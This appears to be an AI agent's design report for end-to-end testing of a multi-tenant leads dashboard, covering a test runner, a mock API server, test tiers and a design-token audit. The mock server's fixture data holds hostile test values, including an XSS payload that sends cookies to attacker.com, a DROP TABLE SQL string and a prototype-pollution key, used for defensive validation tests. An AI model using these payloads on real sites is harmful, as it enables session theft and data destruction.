# E2E Testing Infrastructure Design Report
**Project**: Aura Lead OS Frontend Upgrade (CRG Backoffice SaaS)  
**Author**: teamwork_preview_explorer (Instance 1)  
**Status**: DESIGN & ANALYSIS COMPLETED (Read-Only)  
**Timestamp**: 2026-07-07T03:47:02Z  

---

## Executive Summary
This report defines the architecture, feature inventory, and test coverage matrices for the Aura Lead OS Frontend Upgrade. It details a zero-dependency opaque-box test runner using Node.js's built-in `node:test` framework, a lightweight mock API stub for `/api/backend/leads` enforcing UUID-based multi-tenant isolation, a 4-Tier test suite structure (comprising 35+ test cases), and a compliance audit for the Heritage Design System tokens.

---

## 1. Opaque-Box Test Runner Architecture (`scripts/run-e2e.js`)

An opaque-box test runner tests the application from the outside, exercising fully compiled and running server-side/client-side components without modifying or mocking internal functions in memory. 

### A. Lifecycle Management & Flow
The test runner script (`scripts/run-e2e.js`) controls the startup, verification, execution, and teardown of the frontend and API layers:

1. **Environment Setup**:
   - Spawns the Mock API Server on port `8002`.
   - Spawns the Next.js Frontend Server on port `3000`.
   - Injects `INTERNAL_API_URL=http://localhost:8002` into the Next.js process environment. This ensures that the Next.js proxy route `/api_proxy/api/backend/leads` resolves to `http://localhost:8002/api/backend/leads`.
2. **Liveness Polling**:
   - Polls `http://localhost:8002/health` and `http://localhost:3000/api/ping` via HTTP requests to verify that both servers are fully initialized before running tests.
3. **Execution**:
   - Invokes the test suite runner. To minimize external dependencies and comply with the `CODE_ONLY` network isolation constraints, we utilize Node.js's built-in `node:test` runner.
4. **Teardown & Cleanup**:
   - Catches process exit signals (`SIGINT`, `SIGTERM`, exit).
   - Terminates child processes using their process IDs (`kill()`).
   - Returns the test runner's exit code to the shell.

### B. Proposed `scripts/run-e2e.js` Implementation Design

```javascript
const { spawn } = require("child_process");
const http = require("http");
const path = require("path");

const MOCK_PORT = 8002;
const FRONTEND_PORT = 3000;
let mockProcess = null;
let frontendProcess = null;

// Helper to poll TCP/HTTP health status of a port
function waitOn(url, timeoutMs = 15000) {
  return new Promise((resolve, reject) => {
    const start = Date.now();
    const interval = setInterval(() => {
      if (Date.now() - start > timeoutMs) {
        clearInterval(interval);
        reject(new Error(`Timeout waiting for health check at ${url}`));
      }
      
      http.get(url, (res) => {
        if (res.statusCode >= 200 && res.statusCode < 400) {
          clearInterval(interval);
          resolve();
        }
      }).on("error", () => {
        // Keep polling on connection refusal
      });
    }, 500);
  });
}

async function main() {
  try {
    console.log("🚀 Starting E2E Mock API Server...");
    mockProcess = spawn("node", [path.resolve(__dirname, "mock-server.js")], {
      stdio: "inherit",
    });

    console.log("🚀 Starting Frontend Next.js Server...");
    frontendProcess = spawn("npm", ["run", "start"], {
      cwd: path.resolve(__dirname, "../dashboard"),
      stdio: "inherit",
      env: {
        ...process.env,
        INTERNAL_API_URL: `http://localhost:${MOCK_PORT}`,
        PORT: FRONTEND_PORT,
      },
    });

    // Handle early termination of processes
    mockProcess.on("exit", (code) => {
      if (code !== 0 && code !== null) {
        console.error(`Mock server exited unexpectedly with code ${code}`);
        cleanup(1);
      }
    });

    frontendProcess.on("exit", (code) => {
      if (code !== 0 && code !== null) {
        console.error(`Frontend server exited unexpectedly with code ${code}`);
        cleanup(1);
      }
    });

    console.log("⏳ Waiting for servers to be healthy...");
    await Promise.all([
      waitOn(`http://localhost:${MOCK_PORT}/health`),
      waitOn(`http://localhost:${FRONTEND_PORT}/api_proxy/status`), // verifies the proxy works
    ]);
    console.log("✅ Both servers are online!");

    console.log("🏃 Running E2E Test Suite via Node Test Runner...");
    const testRunner = spawn("node", ["--test", "tests/e2e/**/*.test.js"], {
      cwd: path.resolve(__dirname, ".."),
      stdio: "inherit",
    });

    testRunner.on("close", (code) => {
      console.log(`🏁 Test suite finished with exit code ${code}`);
      cleanup(code);
    });

  } catch (err) {
    console.error("❌ E2E Runner initialization failed:", err);
    cleanup(1);
  }
}

function cleanup(exitCode = 0) {
  console.log("🧹 Tearing down E2E test servers...");
  if (mockProcess) {
    mockProcess.kill("SIGTERM");
  }
  if (frontendProcess) {
    frontendProcess.kill("SIGTERM");
  }
  process.exit(exitCode);
}

// Global process exception catchers
process.on("SIGINT", () => cleanup(1));
process.on("SIGTERM", () => cleanup(1));

main();
```

### C. Package.json Integration
To integrate this script with the dashboard CLI workflow, we append the following command inside `dashboard/package.json` under `"scripts"`:
```json
"test:e2e": "node ../scripts/run-e2e.js"
```
This enables developers to execute `npm run test:e2e` inside the `dashboard` directory to run the full automated integration flow.

---

## 2. Mock Server & API Stub Design (`/api/backend/leads`)

The mock API server functions as a lightweight HTTP microservice representing the gateway backend. It validates tenant assertions and enforces multi-tenant database partitioning.

### A. Core Architectural Design
- **Path Mapping**: Exposes a standard route structure starting with `/api/backend/leads`.
- **Validation Engine**: Examines all incoming requests for the presence of the `x-tenant-id` header or the fallback query parameter `tenant_id`.
- **UUID Conformity**: Verifies that the retrieved tenant ID strictly conforms to RFC 4122 (UUID v4) format. If it does not, it rejects the request with a `400 Bad Request` payload.
- **State Partitioning**: Evaluates data isolation. Stored records are partitioned by tenant IDs.

### B. Mock Server Code Structure (`scripts/mock-server.js`)

```javascript
const http = require("http");
const { parse } = require("url");

// Partitioned In-Memory Database
const leadsDb = {
  // Tenant A: Landscaping Service SaaS (Standard Leads)
  "11111111-1111-1111-1111-111111111111": [
    {
      id: "a1a1a1a1-a1a1-a1a1-a1a1-a1a1a1a1a1a1",
      name: "Arthur Pendragon",
      email: "arthur@camelot.org",
      status: "new",
      created_at: "2026-07-06T12:00:00Z",
      metadata: {
        budget: 4500.0,
        currency: "USD",
        needs_followup: true,
        lawn_size_sqft: 12000,
        service_frequency: "Bi-Weekly"
      }
    },
    {
      id: "a2a2a2a2-a2a2-a2a2-a2a2-a2a2a2a2a2a2",
      name: "Guinevere Leodegrance",
      email: "guin@camelot.org",
      status: "contacted",
      created_at: "2026-07-05T14:30:00Z",
      metadata: {
        budget: 9500.5,
        currency: "USD",
        needs_followup: false,
        lawn_size_sqft: 25000,
        service_frequency: "Weekly"
      }
    }
  ],
  
  // Tenant B: Clean/Empty State Tenant
  "22222222-2222-2222-2222-222222222222": [],
  
  // Tenant C: Malicious Metadata Payload Injection Target (Zod Validation Fuzzing)
  "33333333-3333-3333-3333-333333333333": [
    {
      id: "c1c1c1c1-c1c1-c1c1-c1c1-c1c1c1c1c1c1",
      name: "Fuzz Attacker",
      email: "hacker@evilcorp.com",
      status: "new",
      created_at: "2026-07-06T10:00:00Z",
      metadata: {
        budget: 0,
        currency: "USD",
        __proto__: { admin: true },        // Prototype pollution attempt
        isAdmin: true,                     // Privilege escalation attempt
        sql_injection: "SELECT * FROM users; DROP TABLE leads;",
        xss_payload: "<script>document.location='http://attacker.com/cookie?'+document.cookie</script>"
      }
    }
  ]
};

// UUID validation regex (RFC 4122)
const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

const server = http.createServer((req, res) => {
  const parsedUrl = parse(req.url, true);
  const pathName = parsedUrl.pathname;

  // Global Response Headers (enforces CORS for local testing)
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-tenant-id");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, OPTIONS");

  if (req.method === "OPTIONS") {
    res.writeHead(200);
    res.end();
    return;
  }

  // Health-check endpoint used by the E2E runner
  if (pathName === "/health" && req.method === "GET") {
    res.writeHead(200);
    res.end(JSON.stringify({ status: "healthy" }));
    return;
  }

  // Extract and Validate Tenant ID
  const tenantId = req.headers["x-tenant-id"] || parsedUrl.query.tenant_id;
  if (!tenantId) {
    res.writeHead(400);
    res.end(JSON.stringify({ error: "Bad Request: Missing x-tenant-id header or tenant_id query parameter." }));
    return;
  }

  if (!UUID_REGEX.test(tenantId)) {
    res.writeHead(400);
    res.end(JSON.stringify({ error: "Bad Request: Invalid tenant ID format. Must be a valid UUID v4." }));
    return;
  }

  // Route Handling
  if (pathName === "/api/backend/leads" && req.method === "GET") {
    const data = leadsDb[tenantId] || [];
    res.writeHead(200);
    res.end(JSON.stringify(data));
    return;
  }

  if (pathName === "/api/backend/leads" && req.method === "POST") {
    let body = "";
    req.on("data", chunk => { body += chunk; });
    req.on("end", () => {
      try {
        const payload = JSON.parse(body);
        
        // Assert ID uniqueness and UUID format if supplied
        if (payload.id && !UUID_REGEX.test(payload.id)) {
          res.writeHead(400);
          res.end(JSON.stringify({ error: "Bad Request: Lead ID must be a valid UUID v4." }));
          return;
        }

        const newLead = {
          id: payload.id || require("crypto").randomUUID(),
          name: payload.name || "Unnamed Lead",
          email: payload.email || "no-email@example.com",
          status: payload.status || "new",
          created_at: new Date().toISOString(),
          metadata: payload.metadata || {}
        };

        if (!leadsDb[tenantId]) {
          leadsDb[tenantId] = [];
        }
        leadsDb[tenantId].push(newLead);

        res.writeHead(201);
        res.end(JSON.stringify(newLead));
      } catch (err) {
        res.writeHead(400);
        res.end(JSON.stringify({ error: "Bad Request: Invalid JSON body." }));
      }
    });
    return;
  }

  // Default Route
  res.writeHead(404);
  res.end(JSON.stringify({ error: "Not Found" }));
});

const PORT = 8002;
server.listen(PORT, () => {
  console.log(`Mock server successfully running on http://localhost:${PORT}`);
});
```

---

## 3. Test Inventory: Tiers 1–4 Test Suite Design

The E2E test inventory maps structural components to the 4 testing Tiers specified in `SCOPE.md`.

### Tier 1: Feature Coverage (>=5 Tests per Core Feature)
This tier ensures basic functional capability of each architectural upgrade component in isolation.

#### **Feature 1: Tenant Context (`TenantContext` & `useTenant`)**
- **Test 1.1**: *Context Initialization*. Confirm that the `TenantProvider` renders and defaults to `null` or a standard system fallback.
- **Test 1.2**: *Tenant Switching*. Verify that selection of Tenant B from the UI updates the state value of the context.
- **Test 1.3**: *Hook Verification*. Assert that components consuming `useTenant()` can read the correct `tenant_id` state and receive updates.
- **Test 1.4**: *Boundary Error*. Verify that `useTenant` called in components outside the provider throws an explicit initialization error.
- **Test 1.5**: *Session Persistence*. Verify that reloading the webpage preserves the active `tenant_id` context via LocalStorage or Cookies.

#### **Feature 2: Frontend Data Client (`apiClient` + Header Injection)**
- **Test 2.1**: *Header Injection (GET)*. Intercept a GET request to `/api/backend/leads` and assert that the request header `x-tenant-id` matches the current context UUID.
- **Test 2.2**: *Header Injection (POST)*. Intercept a POST payload creation request and verify the `x-tenant-id` header is attached.
- **Test 2.3**: *Parameter Fallback*. Verify that if custom headers are stripped by a local client environment, the client appends `?tenant_id=UUID` as a query parameter.
- **Test 2.4**: *Client response status code mapping*. Verify that a 400 or 403 API response error causes `apiClient` to throw an error class caught by the frontend error boundary.
- **Test 2.5**: *Client Empty State Parsing*. Confirm that receiving an empty array response `[]` from the API does not crash the client fetching hooks and resolves to `[]`.

#### **Feature 3: Boundary Validation Layer (`MetadataSchema` with Zod)**
- **Test 3.1**: *Type Conformity*. Assert that standard types (number, boolean, string) are processed successfully.
- **Test 3.2**: *Prototype Poisoning Block*. Confirm that metadata payloads containing `__proto__` are filtered, dropping the prototype manipulation keys completely.
- **Test 3.3**: *Privilege Escalation Block*. Verify that keys like `isAdmin: true` or `role: "admin"` are stripped from metadata objects by Zod schemas.
- **Test 3.4**: *XSS Vector Isolation*. Check that string attributes containing script tags are stripped or sanitized.
- **Test 3.5**: *Validation Fallback*. Confirm that a totally malformed metadata body (e.g. non-JSON text or list) is safely forced to `{}` by the boundary.

#### **Feature 4: Normalization Layer (`MetadataTransformer`)**
- **Test 4.1**: *Label Conversion*. Verify that snake_case keys (e.g. `service_frequency`) are normalized to Title Case sentences ("Service Frequency").
- **Test 4.2**: *Ordered Array Generation*. Assert that output properties are sorted according to defined field weights (e.g. status/needs_followup always rendered first).
- **Test 4.3**: *Datatype Detection*. Verify that the transformer classifies text, numbers, booleans, dates, and currencies correctly.
- **Test 4.4**: *Currency Formatter*. Confirm that numbers flagged as currency are formatted cleanly (e.g., `4500` -> `$4,500.00`).
- **Test 4.5**: *Unrecognized Key Handling*. Verify that unmapped custom keys are preserved and formatted safely instead of being discarded.

#### **Feature 5: Component Registry (Render Dispatcher)**
- **Test 5.1**: *Date Component Dispatch*. Assert that ISO timestamps are dispatched to the `DateComponent` showing relative formats (e.g., "1 day ago").
- **Test 5.2**: *Currency Component Dispatch*. Verify monetary figures map to `CurrencyComponent` with appropriate text sizes and color styling.
- **Test 5.3**: *Boolean Badge Dispatch*. Confirm true/false values display as styled green/red icon badges.
- **Test 5.4**: *Text Component Dispatch*. Verify strings compile to default Paragraph layouts.
- **Test 5.5**: *Empty Attribute Dispatch*. Assert null values generate `—` instead of blank DOM nodes.

---

### Tier 2: Boundary / Corner Cases
Tests targeting system limitations, malformed interfaces, and error conditions.

- **Test Case 2.1: Invalid UUID Injections**: Send malformed tenant ID parameters (e.g., `"12345"`, `""`, `"non-hex-characters-here"`) to the backend via proxy. Verify that the client displays a "Malformed Tenant Session" error screen.
- **Test Case 2.2: Cross-Tenant Data Access Request**: Attempt to request a lead detail view on Tenant B's session using a Lead ID known to belong to Tenant A. Verify that the client renders a "404 Lead Not Found" or "403 Forbidden" error, confirming that data isolation boundaries are enforced.
- **Test Case 2.3: Payload Scale Limit**: Push a lead creation request containing an excessively large metadata array (e.g., 200+ fields, or 10MB of payload). Assert that the client validation boundary rejects the upload with an input-size error instead of executing it and causing memory issues.
- **Test Case 2.4: Injection Attack String Values**: Inject SQL syntax sequences and HTML elements into metadata text values. Ensure that during rendering, these values are escaped, preventing injection attacks in both the browser and API gateway.
- **Test Case 2.5: Zero/Null States**: Simulate a tenant session returning 0 leads. Confirm the dashboard displays a clear, stylized "No Leads Registered" empty state block instead of a blank page or spinner.

---

### Tier 3: Cross-Feature Combinations
Tests designed to trace interactions between multiple distinct components.

- **Test Case 3.1: Switch Tenant Mid-Flight**: Trigger a fetch call to load leads for Tenant A, and immediately select Tenant B. Assert that the dashboard discards Tenant A's incoming response, cancels the active request, and renders Tenant B's data, verifying that no race conditions leak data between tenants.
- **Test Case 3.2: Create and Display Workflow Cascade**: Call the creation API for a new lead with complex custom metadata. Trace it through:
  1. *Validation*: schema passes.
  2. *Normalization*: keys transformed.
  3. *Registry*: matching UI elements render on the board.
- **Test Case 3.3: Data Type Coercion Flow**: Input numeric string representations (e.g. `"15000"`) into currency inputs. Verify that the Zod boundary and transformer safely coerce it to a float `15000.00` and pass it to the UI component.
- **Test Case 3.4: Isolated Modification check**: Add a lead on Tenant A. Switch to Tenant B and confirm that Tenant B's UI count is unaffected and the lead is inaccessible.
- **Test Case 3.5: Metadata Validation Failure Recovery**: Post a lead with some valid data alongside invalid metadata fields. Verify that Zod strips the malformed components but lets the core lead (name, email) render safely.

---

### Tier 4: Real-World Scenarios
Complex real-world user paths.

- **Scenario 4.1: Landscaping SaaS Tenant Lifecycle**:
  1. Login as Landscaping tenant (`tenant_id: "11111111-1111-1111-1111-111111111111"`).
  2. Load Lead Dashboard.
  3. Verify cards display custom landscaping parameters ("Lawn Size: 12,000 sqft", "Service Frequency: Bi-Weekly").
  4. Submit an update to "Lawn Size" to "15,000 sqft" and verify that it updates immediately in the UI.
  5. Inspect typography and alignment, ensuring that the headers use `Public Sans` and label badges conform to the Heritage styling scheme.
- **Scenario 4.2: Session Restoration & URL Manipulation**:
  1. Authenticate with Tenant A and close the browser.
  2. Re-open the page. Verify the dashboard loads Tenant A's leads by reading local storage.
  3. Alter the query parameter to a non-existent tenant ID. Verify that the system intercepts the request, flags the tenant ID as invalid, and redirects to a safe state or error screen.
- **Scenario 4.3: Concurrent Multi-Tenant Operations**:
  - Open two separate browser contexts simulating Tenant A and Tenant B. Verify that actions performed on Tenant A (e.g., adding leads, changing view columns) do not affect Tenant B's screen or context parameters.

---

## 4. Heritage Design System Conformance Audit

The Heritage Design System balances premium minimalism with clear data displays. A review of the current implementation in `dashboard/src/app/globals.css` against `dashboard/DESIGN.md` reveals key alignment opportunities.

### A. Token Comparison

| Attribute | Heritage Spec (`DESIGN.md`) | Current Implementation (`globals.css`) | Status / Issue |
|---|---|---|---|
| **Primary Color** | `#1A1C1E` (Dark Slate Charcoal) | `#0F2537` (Deep Oceanic Blue) | **MISMAPPED** (Deviates to blue-toned palette) |
| **Secondary Color** | `#6C7278` (Slate Gray) | `rgba(15, 37, 55, 0.65)` (Translucent Ink) | **MISMAPPED** (Uses blue ink opacity) |
| **Tertiary Color** | `#B8422E` (Boston Clay Orange/Red) | `#00885F` (Planhat Emerald Green) | **MISMAPPED** (Uses green instead of clay red) |
| **Accent Color** | (Defined under Tertiary) | `#B8422E` (Boston Clay) | **ALIGNED** (Accent maps to Boston Clay) |
| **Neutral Color** | `#F7F5F2` (Limestone/Sand) | `#FFFFFF` (Pure White) | **MISMAPPED** (Uses generic flat white background) |
| **Border Color** | Muted Slate alpha blends | `rgba(15, 37, 55, 0.08)` (Ink alpha) | **MISMAPPED** (Uses oceanic ink alpha) |
| **Radii** | `sm: 4px`, `md: 8px` | `sm: 4px`, `md: 8px` | **ALIGNED** |
| **Spacing** | `sm: 8px`, `md: 16px` | `sm: 8px`, `md: 16px` | **ALIGNED** |
| **Typography** | `Public Sans` (Headers), `Space Grotesk` (Labels) | `Public Sans` (Headers), `Space Grotesk` (Labels) | **ALIGNED** |

### B. Findings
1. **Color Palette Mismatch**: The color theme in `globals.css` uses an Oceanic Blue / Pure White / Emerald Green motif. This deviates from the core Limestone (`#F7F5F2`) and Slate (`#1A1C1E`) colors defined in the Heritage specifications.
2. **Typography Alignment**: The typography is correctly configured via Google Fonts and Tailwind `@theme` properties inside `globals.css`, ensuring `Public Sans` and `Space Grotesk` are loaded.
3. **Radii & Spacing Compliance**: The border-radius and grid spacing properties conform to the `8px` design system rules.

### C. Mitigation & Scoping Strategy
To ensure strict Heritage compliance without impacting other parts of the dashboard that may rely on the Oceanic Blue palette, we propose introducing a scoped CSS wrapper class (`.heritage-container`) in `globals.css`. 

```css
/* Scoped Heritage Theme Wrapper */
.heritage-container {
  --primary: #1A1C1E;
  --secondary: #6C7278;
  --tertiary: #B8422E;
  --accent: #B8422E;
  --neutral: #F7F5F2;
  
  --background: var(--neutral);
  --foreground: var(--primary);
  
  --border: rgba(26, 28, 30, 0.08);
  --border-muted: rgba(26, 28, 30, 0.04);
  --card: #FFFFFF;
  --sand: rgba(184, 66, 46, 0.04); /* Boston Clay accent hover state */
  --grain-opacity: 0.02;           /* Subtle matte texture */
}
```

Wrapping the Leads dashboard component hierarchy inside an element with the `heritage-container` class dynamically overrides the default Tailwind v4 CSS variables, ensuring full compliance with the Limestone and Boston Clay specifications.

---

## 5. Verification Commands

Once the implementation track finishes compiling these modules, the test suite can be executed using:

```bash
# Execute within the dashboard directory
cd dashboard
npm run test:e2e
```

To run the mock API server independently for manual verification or frontend fuzzer testing:
```bash
node scripts/mock-server.js
```
The test suite can then be run in standalone mode with:
```bash
node --test tests/e2e/**/*.test.js
```
